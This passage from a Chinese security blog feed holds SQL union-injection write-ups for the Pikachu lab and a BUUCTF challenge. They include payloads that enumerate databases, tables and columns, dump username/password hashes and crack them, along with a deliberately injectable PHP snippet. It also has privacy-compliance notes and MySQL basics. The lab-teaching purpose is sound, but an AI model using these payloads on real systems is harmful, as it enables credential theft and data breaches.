    <content type="html"><![CDATA[<h1 id="联合查询注入——数字型注入"><a href="#联合查询注入——数字型注入" class="headerlink" title="联合查询注入——数字型注入"></a>联合查询注入——数字型注入</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/1.jpg" style="zoom: 80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见在界面中有下拉框，包含了1到6的数字，我们只能够选择数字，点击对应的数字回馈对应的用户信息，无法进行输入，所以我们需要将注意力放到报文当中</p><h4 id="2-分析报文"><a href="#2-分析报文" class="headerlink" title="2.分析报文"></a>2.分析报文</h4><p>&emsp;&emsp;点击数字1进行查询，得到如下报文：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;在报文中显示中可以看见传送了id=1的内容，可以判断出该处为注入点。</p><h4 id="3-进行注入"><a href="#3-进行注入" class="headerlink" title="3.进行注入"></a>3.进行注入</h4><p>&emsp;&emsp;分析查询结果：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;查询的结果可以看见，返回的是一个人名和一个邮箱，所以猜测查询语句查询了两个字段，在注入点中使用order语句测试字段数</p><p>&emsp;&emsp;先测试注入两个字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/5.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/6.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，反馈是正常的，接下来尝试注入三个字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/7.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/8.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;通过2列和3列的注入反馈不同，说明没有第三列，查询语句指用了两个列名，假设治理使用的SQL语句为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select 人名 邮箱 <span class="hljs-keyword">from</span> 用户表 <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="4-尝试or的注入"><a href="#4-尝试or的注入" class="headerlink" title="4.尝试or的注入"></a>4.尝试or的注入</h4><p>&emsp;&emsp;尝试让它将用户表所有人的信息查询出来，在后面加上永真的判断注入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/9.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/10.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见反馈出了所有人的名单信息，说明注册成功。</p><h4 id="5-获取数据库名"><a href="#5-获取数据库名" class="headerlink" title="5.获取数据库名"></a>5.获取数据库名</h4><p>&emsp;&emsp;使用 union 查询当前的数据名和当前的用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-keyword">user</span>()<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/11.jpg" style="zoom:80%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/12.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见在反馈中给出了数据名和当前的用户信息。</p><h4 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h4><p>&emsp;&emsp;利用查出来的数据库名称 <strong>pikachu</strong> 构建payload查询表名:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> table_schema,table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/13.jpg" style="zoom:68%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/14.jpg" style="zoom:60%;" /></center><h4 id="7-获取表"><a href="#7-获取表" class="headerlink" title="7.获取表"></a>7.获取表</h4><p>&emsp;&emsp;查询pikachu这个数据库发现里面有个users表，查看相关内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> table_name,column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/15.jpg" style="zoom:68%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/16.jpg" style="zoom:60%;" /></center><h4 id="8-获取表的内容"><a href="#8-获取表的内容" class="headerlink" title="8.获取表的内容"></a>8.获取表的内容</h4><p>&emsp;&emsp;通过第七步，就知道了所属的所有表名，接下由于联合查询要求前后两个SQL语句的列名数要一致，所以这里只能用两个列名进行查询。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/17.jpg" style="zoom:68%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/18.jpg" style="zoom:60%;" /></center><h4 id="9-进行解码"><a href="#9-进行解码" class="headerlink" title="9.进行解码"></a>9.进行解码</h4><p>&emsp;&emsp;通过上述的SQL注入，我们得到了三组用户名和密码</p><p>整理用户名和密码</p><ul><li><p>用户名 admin</p><ul><li>密码 e10adc3949ba59abbe56e057f20f883e</li></ul></li><li><p>用户名 pikachu</p><ul><li>密码 670b14728ad9902aecba32e22fa4f6bd</li></ul></li></ul><ul><li><p>用户名 test</p><ul><li>密码 e99a18c428cb38d5f260853678922e03</li></ul></li></ul><p>&emsp;&emsp;使用kali的工具hash-identitier判断用户的密码的哈希类型最终确定为MD5，进行解码：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/19.jpg" style="zoom:70%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/20.jpg" style="zoom:70%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%95%B0%E5%AD%97%E5%9E%8B/21.jpg" style="zoom:70%;" /></center><p>&emsp;&emsp;好家伙，不只是可以注入还是弱口令，框框给他几个大嘴巴子</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——联合查询注入</title>
    <link href="/2022/08/06/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/06/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——联合查询注入"><a href="#SQL注入——联合查询注入" class="headerlink" title="SQL注入——联合查询注入"></a>SQL注入——联合查询注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;联合查询注入是可回显的注入，在联合查询中，一般会将数据库查询的数据返回到页面中。联合查询注入利用的前提是初始的页面上有显示位，在一个网页的正常界面中，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>...<br><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]；<br><br><span class="hljs-variable">$getid</span>=<span class="hljs-string">&quot;SELECT id FROM users WHERE uer_id = &#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getid</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>().<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>);<br><br><span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">mysql_numrows</span>(<span class="hljs-variable">$result</span>);<br>...<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;可以看见在$id变量中，该变量会将get传送过来的参数直接拼接到SQL语句中，如果我们输入的内容为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union+select+1+--+</span><br></code></pre></td></tr></table></figure><p>  &emsp;&emsp;拼接后SQL语句就变成了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp; 闭合前面的单引号，注释掉了后面的单引号，只需要在中间写上需要的Payload（有效负荷代码）就可以了。而加号则是服务器在处理用户输入的时候已自动将其转义为空字符了。</p><p>&emsp;（接下来的演示以BUUCTF中的SQL注入-1为例）：</p><h4 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h4><p>&emsp;&Emsp;我们在可能存在SQL注入变量的后边添加Payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1/and <span class="hljs-attribute">1</span>=2（整型判断）<br><br>单引号判断<span class="hljs-string">&#x27;显示数据库错误信息或者页面回显不同（整型、字符串类型判断）</span><br><span class="hljs-string"></span><br><span class="hljs-string">\（转义符）</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1/+1回显下一个或上一个页面（整型判断）</span><br><span class="hljs-string"></span><br><span class="hljs-string">注：加号&#x27;</span>+<span class="hljs-string">&#x27;在URL中有特殊含义，因此在需要对其进行URL编码为%2b</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="2-判断是整型还是字符型"><a href="#2-判断是整型还是字符型" class="headerlink" title="2.判断是整型还是字符型"></a>2.判断是整型还是字符型</h4><p>&emsp;&emsp;输入and 1=1和and 1=2根据界面是否变化判断是否为整型注入。  判断是字符型还是数字型的表格：</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/3.png"></p><p>输入’ and 1=1 %23和 ‘ and 1=2%23后发现页面变化，判断为字符注入 </p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/1.png"></p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/2.png"></p><p>&emsp;&emsp;</p><h4 id="3-判断查询列数"><a href="#3-判断查询列数" class="headerlink" title="3.判断查询列数"></a>3.判断查询列数</h4><p> &emsp;&emsp;order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。</p><p>&emsp;&emsp;输入3列时，页面正常: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;order by 3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/4.png"></p><p>&emsp;&emsp;输入4列时,页面出错，说明只有3列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;order by 4%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/5.png"></p><p>&emsp;</p><h4 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4.判断显示位"></a>4.判断显示位</h4><p>&emsp;&emsp;union的作用是将两个select查询结果合并，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/6.png"></p><p>&emsp;</p><h4 id="5-获取所有数据库名"><a href="#5-获取所有数据库名" class="headerlink" title="5.获取所有数据库名"></a>5.获取所有数据库名</h4><p>&emsp;&emsp;可以通过使用注入查询数据库语句显示当前所有数据库： databas()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/7.png"></p><p>&emsp;&emsp;可以看见，输入完毕后，第三行会将所存在的数据库输出到显示屏中    </p><p>&emsp;</p><h4 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h4><p>&emsp;&emsp;在获取数据库的信息后，查找对应数据库里所拥有的表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>mysql<span class="hljs-string">&#x27;),3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/8.png"></p><p>&emsp;&emsp;’mysql’为数据库名，通过改变数据库名，进行不同数据库的内容查询</p><p>&emsp;</p><h4 id="7-获列名"><a href="#7-获列名" class="headerlink" title="7.获列名"></a>7.获列名</h4><p>&emsp;&emsp;查看表的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>note<span class="hljs-string">&#x27; and table_name=&#x27;</span>fl4g<span class="hljs-string">&#x27;),3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/9.png"></p><h4 id="8-获取列中的信息"><a href="#8-获取列中的信息" class="headerlink" title="8.获取列中的信息"></a>8.获取列中的信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(fllllag),3 from fl4g%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/10.png"></p><p>&emsp;&emsp;最终获得flag</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全技术前沿研究笔记（二）</title>
    <link href="/2022/08/06/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%85%AD/"/>
    <url>/2022/08/06/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全技术前沿研究笔记（二）"><a href="#数据安全技术前沿研究笔记（二）" class="headerlink" title="数据安全技术前沿研究笔记（二）"></a>数据安全技术前沿研究笔记（二）</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;由于第二章没啥好总结的，大多都是一些合规下数据安全类的文字阐述，和第一章的中心思路基本不差，我们就直接开始第三章的“前沿技术赋能用户隐私数据安全合规”。在该文章中，企业的用户隐私数据安全合规场景主要是是三种典型也对应了三种前沿技术（差分隐私、知识图谱和流程自动化）</p><p>&emsp;&emsp;（以下是第三章的部分摘抄）</p><p>&emsp;</p><h4 id="2-数据采集中隐私保护"><a href="#2-数据采集中隐私保护" class="headerlink" title="2.数据采集中隐私保护"></a>2.数据采集中隐私保护</h4><ul><li><h6 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h6></li></ul><p>&emsp;&emsp;在保护用户的个人隐私前提下，对大量用户的隐私数据进行采集，在服务器中完成数据的聚合和分析,挖掘大规模用户数据的整体趋势和统计信息。</p><ul><li><h6 id="合约条款"><a href="#合约条款" class="headerlink" title="合约条款"></a>合约条款</h6></li></ul><p>&emsp;&emsp;GDPR：为了应对隐私问题带来的风险的挑战，GDPR 指出数据控制者与处理者“应当执行合适的技术措施和有组织性的措施来保证合理应对风险的安全水平”。</p><p>&emsp;&emsp;《网络安全法》：“网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失”。即要求企业采取一定的技术与管理措施，确保用户个人信息与隐私安全。</p><ul><li><h6 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h6></li></ul><p>&emsp;&emsp;在传统的数据安全处理技术——去标识化（数据脱敏），在企业部分主要场景中一般可应对合规性，符合GDPR和《网络安全法》要求采取的必要措施。但是，在一些内部环境（如大部分内部用户可以访问和下载）或外部共享环境总，它处理后的数据仍然面临多种多样的隐私攻击，包括背景知识攻击、差分攻击和重标识攻击等。经过攻击后，个人隐私仍然有可能会被泄露，若对数据进行多度脱敏，虽然数据的隐私攻击风险降低，但数据的可用性也就大幅度降低。如何有效的防范隐私攻击又保留数据的可用性，也就是获取数据的聚合信息但无法获得单个记录的信息，这就是需要更高的技术。</p><ul><li><h6 id="对应技术"><a href="#对应技术" class="headerlink" title="对应技术"></a>对应技术</h6></li></ul><p>&emsp;&emsp;差分隐私</p><p>&emsp;</p><h4 id="3-个人信息治理与可视化"><a href="#3-个人信息治理与可视化" class="headerlink" title="3.个人信息治理与可视化"></a>3.个人信息治理与可视化</h4><ul><li><h6 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h6></li></ul><p>&emsp;&emsp;同一个企业的多个应用中，可能通过收集用户的多个 维度的个人信息与隐私数据。 此外，数据采集可能分布存储在多种多个数据库（ 如Oracle、MySQL/ElasticSearch）以及各种大数据平台中（HDFS 和 Hbase）。企业需要摸清企业内部有多少个独立的数据实体（数据主体），每一个实体包括哪些数据与属性维度，这些数据分别存储在哪些系统中和业务应用，以及数据共享给哪些第三方企业。</p><ul><li><h6 id="合约条款-1"><a href="#合约条款-1" class="headerlink" title="合约条款"></a>合约条款</h6></li></ul><p>&emsp;&emsp;GDPR：如 1.2.2 节所述，GDPR 赋予了用户知情权、访问权、修改权、限制处理权、 被遗忘权、可携带权、拒绝权等多项权利。相应地，企业必须履行和响应用户提出的权利请求。比如用户发起数据查看请求，那么企业必须完整呈现数据主体个人数据报告，包括收集了用户哪些结构化数据、哪些非结构化数据（包括网络浏览、点击等信息）、以及将数据共享给了哪些第三方企业。企业在实施用户权利请求响应的合规，个人信息治理与可视化是实现目标的关键。</p><p>&emsp;&emsp;《网络安全法》：如 1.2.2 节所述，法规赋予了用户一定程度的“删除权”和“修改权”，响应地，企业须履行和配合用户完成数据权利请求的流程。同样地，企业在具体实施合规落地时，个人信息治理与可视化是基础与前提。</p><ul><li><h6 id="挑战-1"><a href="#挑战-1" class="headerlink" title="挑战"></a>挑战</h6></li></ul><p>&emsp;&emsp;多源异构数据源分布同一个使用主体的信息和维度，对于企业复杂多变的数据环境来说，不同数据源实体ID表示显示不同或者缺失，如何识别与关联同一个实体是一个不小的挑战。</p><ul><li><h6 id="对应技术-1"><a href="#对应技术-1" class="headerlink" title="对应技术"></a>对应技术</h6></li></ul><p>&emsp;&emsp;知识图谱</p><p>&emsp;</p><h4 id="4-用户数据权利全球响应"><a href="#4-用户数据权利全球响应" class="headerlink" title="4.用户数据权利全球响应"></a>4.用户数据权利全球响应</h4><ul><li><h6 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h6></li></ul><p>&emsp;&emsp;全球一些隐私法规赋予数据主体（用户）自由访问、修改和删除个人数据等权利，相应地，要求企业必须在规定的时间内对用户提出的请求进行响应，比如向用户提供收集个人数据明细及使用目的报告。</p><ul><li><h6 id="合约条款-2"><a href="#合约条款-2" class="headerlink" title="合约条款"></a>合约条款</h6></li></ul><p>&emsp;&emsp;GDPR：规定企业“必须在一个月内对所有的请求进行响应和处理，若请求过于复杂，可延长至“两个月”。</p><p>&emsp;&emsp;《网络安全法》：法规赋予了用户一定程度的“删除权”和“修改权”，但未具体到响应时间的规定。但在国家标准《个人信息安全规范》（GB/T 35273-2020），明确规定从请求到响应的时间是 30 天内。</p><ul><li><h6 id="挑战-2"><a href="#挑战-2" class="headerlink" title="挑战"></a>挑战</h6></li></ul><p>&emsp;&emsp;许多企业无法应对数据主体权利请求，约有三分之二企业对当个SSR的回复需要出国两周以上的时间，且这些流程通常是人工完成，平均成本很高。因此，对于拥有一定用户数量规模的企业，如何应对多个用户并发请求的随时响应。</p><ul><li><h6 id="应对技术"><a href="#应对技术" class="headerlink" title="应对技术"></a>应对技术</h6></li></ul><p>&emsp;&emsp;流程自动化</p><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——MySQL</title>
    <link href="/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/"/>
    <url>/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——MySQL"><a href="#SQL注入——MySQL" class="headerlink" title="SQL注入——MySQL"></a>SQL注入——MySQL</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;由于数据库的类型中，MySQL类型数据库是比较主流的，所以需要了解一些MySQL的相关知识。</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/1.png"></p><p>&emsp;&emsp;(图片的蓝框部分打错了，懂意思就是，懒得改了)</p><p>&emsp;&emsp;可以看到在MYSQL5.0以上版本中，存在着名为information_schema的库，在这个库中存储记录了所有数据库名，表名，列名。也就一般来说我们可以通过查询它获取指定数据库下面的表名或者列名信息。而在数据库中符号“.”代表下一级，譬如liaoyue.use代表的意思是liaoyue数据下名为user的表。这都是要掌握的相关知识。</p><p>&emsp;</p><h4 id="2-MySQL-5-x结构"><a href="#2-MySQL-5-x结构" class="headerlink" title="2.MySQL 5.x结构"></a>2.MySQL 5.x结构</h4><ol><li>在MySQL 5.0以上版本中，为了方便管理，默认定义了information_schema数据 库，用来存储数据库元信息，其中具有表schemata（数据库名），table（表名），columns（列名或字段名）</li><li>在schemata表中，schema_name字段用来存储数据库名</li><li>在table表中，table_schema和table_name分别用来存储数据库名和表名</li><li>在column表中，table_schema（数据库名），table_name（表名），column_name（字段名）</li></ol><p>&emsp;</p><h4 id="3-常用的相关参数"><a href="#3-常用的相关参数" class="headerlink" title="3.常用的相关参数"></a>3.常用的相关参数</h4><ul><li>information_schema.tables：记录所有表名信息的表</li><li>information_schema.columns：记录所有列名信息的表</li><li>table_name：表名</li><li>column_name：列名</li><li>table_schema：数据库名</li><li>user()  查看当前MySQL登录的用户名</li><li>database()   查看当前使用MySQL数据库名</li><li>version()  查看当前MySQL版本</li></ul><p>&emsp;</p><h4 id="4-对数据库的增删改查"><a href="#4-对数据库的增删改查" class="headerlink" title="4.对数据库的增删改查"></a>4.对数据库的增删改查</h4><ul><li><p>增  create database 数据库名</p></li><li><p>删  drop database 数据库名</p></li><li><p>改  rename database 旧名 to 新名</p></li><li><p>查  show databases</p></li><li><p>创建表 create table table_name( id1 int,id2 varcher)</p></li><li><p>重新给表命名 alter table table_name_old rename as table_name_new</p></li></ul><ol><li>&emsp;</li></ol><h4 id="5-对数据表的增删改查"><a href="#5-对数据表的增删改查" class="headerlink" title="5.对数据表的增删改查"></a>5.对数据表的增删改查</h4><ul><li>  a. 增    insert into table_name(列1，列2 … ) values(值1，值2 … )</li><li>  b. 删    delete from 表名 where 列名 = 值</li><li>  c. 改    update 表名 set 列名=新值 where 列名=某值</li><li>  d. 查    select * from 表名 where 